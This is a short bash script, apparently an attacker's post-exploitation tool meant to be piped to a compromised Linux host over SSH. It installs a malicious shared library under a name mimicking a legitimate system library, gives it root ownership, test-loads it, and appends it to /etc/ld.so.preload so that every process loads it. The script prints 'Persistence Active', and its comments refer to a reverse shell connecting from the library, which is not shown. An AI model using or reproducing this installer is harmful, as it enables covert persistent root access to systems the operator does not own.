#!/usr/bin/env bash
# ld_install.sh - Run on target via SSH pipe

SO_SRC="/tmp/libdconf-update.so"
SO_DEST="/usr/lib/x86_64-linux-gnu/libdconf-1.so.0.99"

# -- Existence Check --
if [[ ! -f "$SO_SRC" ]]; then
    echo "[-] Error: Library not found at $SO_SRC"
    exit 1
fi

# -- Move and Set Permissions --
mv "$SO_SRC" "$SO_DEST"
chown root:root "$SO_DEST"
chmod 644 "$SO_DEST"

# -- SAFETY CHECK --
# This runs /bin/true with library. If it segfaults, stop before editing preload
echo "[*] Verifying library integrity..."
# timeout 2 allows the script to continue even if a shell is caught
if ! timeout 2 bash -c "LD_PRELOAD='$SO_DEST' /bin/true" >/dev/null 2>&1; then
    echo "[-] CRITICAL FAILURE: Library is unstable!"
    rm -f "$SO_DEST"
    exit 1
fi

# -- Activation --
# If the safety check passes, commit the path to /etc/ld.so.preload
if ! grep -q "$SO_DEST" /etc/ld.so.preload 2>/dev/null; then
    echo "$SO_DEST" >> /etc/ld.so.preload
    echo "[+] Integrity verified. Persistence Active."
    # Gives the background shell from the safety check time to connect
    sleep 2 
else
    echo "[*] Persistence already exists."
fi